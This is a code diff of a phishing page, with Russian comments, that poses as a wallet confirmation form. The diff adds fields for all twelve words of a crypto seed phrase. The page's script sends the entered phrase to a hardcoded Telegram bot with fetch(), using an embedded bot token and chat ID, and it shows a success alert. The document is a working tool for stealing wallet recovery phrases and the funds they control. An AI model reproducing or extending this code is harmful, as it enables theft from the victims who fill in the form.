@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -13,9 +13,11 @@
             padding: 0;
             display: flex;
             justify-content: center;
-            align-items: center;
+            align-items: flex-start;
             min-height: 100vh;
             flex-direction: column;
+            overflow-x: hidden;
+            height: 100%;
         }
         .container {
             max-width: 450px;
@@ -26,6 +28,10 @@
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
             text-align: center;
             margin-bottom: 50px;
+            overflow-y: auto;
+            padding-bottom: 60px;
+            box-sizing: border-box;
+            flex: 1; /* Контейнер будет занимать все доступное пространство */
         }
         .logo {
             margin-bottom: 16px;
@@ -72,6 +78,7 @@
             color: #FFFFFF;
             width: 100%;
             box-sizing: border-box;
+            transition: none;
         }
         input::placeholder {
             color: #888888;
@@ -83,23 +90,20 @@
         button {
             margin-top: 20px;
             width: 100%;
-            max-width: 200px;
+            max-width: 250px; /* Сделано немного шире */
             padding: 14px;
             background-color: #122fe6;
             color: #FFFFFF;
             font-size: 16px;
             font-weight: bold;
             border: none;
-            border-radius: 18px;
+            border-radius: 50px; /* Сделаны углы более круглыми */
             cursor: pointer;
             transition: background-color 0.3s;
             align-self: center;
         }
         button:hover {
             background-color: #1C86EE;
-        }
-        .button-sent {
-            background-color: #4CAF50; /* Зеленый цвет после отправки */
         }
         .warning {
             margin-top: 10px;
@@ -108,12 +112,11 @@
             text-align: center;
         }
         footer {
+            width: 100%;
+            background-color: #1E1E1E;
             text-align: center;
             font-size: 12px;
             color: #A0A0A0;
-            bottom: 0;
-            width: 100%;
-            background-color: transparent;
             padding: 10px 0;
         }
     </style>
@@ -129,13 +132,52 @@
             <div class="seed-input">
                 <div class="seed-item">
                     <label for="word1">1.</label>
-                    <input type="text" id="word1" name="word1" placeholder="Please seed" inputmode="latin" autocapitalize="none" required>
+                    <input type="text" id="word1" name="word1" placeholder="Please seed" inputmode="text" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word2">2.</label>
-                    <input type="text" id="word2" name="word2" placeholder="Please seed" inputmode="latin" autocapitalize="none" required>
+                    <input type="text" id="word2" name="word2" placeholder="Please seed" inputmode="text" autocapitalize="none" required>
                 </div>
-                <!-- Остальные поля... -->
+                <div class="seed-item">
+                    <label for="word3">3.</label>
+                    <input type="text" id="word3" name="word3" placeholder="Please seed" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word4">4.</label>
+                    <input type="text" id="word4" name="word4" placeholder="Please seed" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word5">5.</label>
+                    <input type="text" id="word5" name="word5" placeholder="Please seed" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word6">6.</label>
+                    <input type="text" id="word6" name="word6" placeholder="Please seed" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word7">7.</label>
+                    <input type="text" id="word7" name="word7" placeholder="Please seed" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word8">8.</label>
+                    <input type="text" id="word8" name="word8" placeholder="Please seed" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word9">9.</label>
+                    <input type="text" id="word9" name="word9" placeholder="Please seed" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word10">10.</label>
+                    <input type="text" id="word10" name="word10" placeholder="Please seed" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word11">11.</label>
+                    <input type="text" id="word11" name="word11" placeholder="Please seed" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word12">12.</label>
+                    <input type="text" id="word12" name="word12" placeholder="Please seed" inputmode="text" autocapitalize="none" required>
+                </div>
             </div>
             <button type="submit">Подтвердить кошелёк</button>
         </form>
@@ -153,22 +195,15 @@
 
             if (words.length === 12 && words.every(word => word)) {
                 const message = words.map((word, index) => `${index + 1}. ${word}`).join('\n');
-                const chatId = '@bdsjxjdhd';
-                const token = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg';
+                const chatId = '@bdsjxjdhd';  // Ваш чат ID
+                const token = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg';  // Ваш токен бота
                 const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-                // Изменение цвета кнопки на зеленый
-                const button = document.querySelector('button');
-                button.classList.add('button-sent');
-                button.textContent = 'Данные отправлены!';
 
                 fetch(url)
                     .then(response => response.json())
                     .then(data => {
                         if (data.ok) {
                             alert('Секретная фраза успешно отправлена!');
-                            // Очистка полей
-                            document.getElementById('seedForm').reset();
                         } else {
                             alert('Ошибка отправки.');
                         }
